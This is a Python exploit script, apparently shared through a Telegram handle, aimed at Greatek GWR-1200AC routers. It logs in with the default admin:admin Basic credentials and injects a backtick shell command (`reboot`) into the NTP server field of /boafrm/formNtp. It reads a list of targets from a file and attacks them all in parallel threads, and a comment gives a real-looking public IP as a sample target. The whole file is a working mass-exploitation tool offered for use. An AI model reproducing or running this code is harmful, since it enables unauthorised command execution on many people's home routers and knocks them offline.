import urllib.request
import urllib.error
from io import BytesIO
from threading import Thread

#basic auth exploit make by https://t.me/endiannesss
#POST /boafrm/formNtp HTTP/1.1
#Host: 191.5.235.178
#User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
#Accept-Language: en-US,en;q=0.5
#Accept-Encoding: gzip, deflate
#Content-Type: application/x-www-form-urlencoded
#Content-Length: 195
#Origin: http://191.5.235.178
#Authorization: Basic YWRtaW46YWRtaW4= admin:admin can add more creds
#Connection: keep-alive
#Referer: http://191.5.235.178/ntp.htm
#Upgrade-Insecure-Requests: 1
#Greatek GWR-1200AC router

payload = "%60reboot%60"
body = "timeZone=3+2&enabled=ON&ntpServerIp1=ca.pool.ntp.org&ntpServerId=1&ntpServerIp2="+payload+"&submit-url=%2Fntp.htm&save_apply=Salvar+%26+Aplicar"


def exploit(target):
    try:
        req = urllib.request.Request("http://"+target+"/boafrm/formNtp")

        req.add_header("host", target)
        req.add_header("Content-Length", "195")
        req.add_header("Authorization", "Basic YWRtaW46YWRtaW4=")
        req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0")
        req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
        req.add_header("Accept-Language", "en-US,en;q=0.5")
        req.add_header("Accept-Encoding", "gzip, deflate")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("Origin", "http://"+target+"")
        req.add_header("Connection", "keep-alive")
        req.add_header("Referer", "http://"+target+"/ntp.htm")
        req.add_header("Upgrade-Insecure-Requests", "1")

        response = urllib.request.urlopen(req, data=bytes(body, 'utf-8'))

        if response.status == 200:
            print("200 " + target)
    except Exception as e:
        #print(e)
        pass

for line in open('f').readlines():
    Thread(target=exploit, args=(line.rstrip(),)).start()
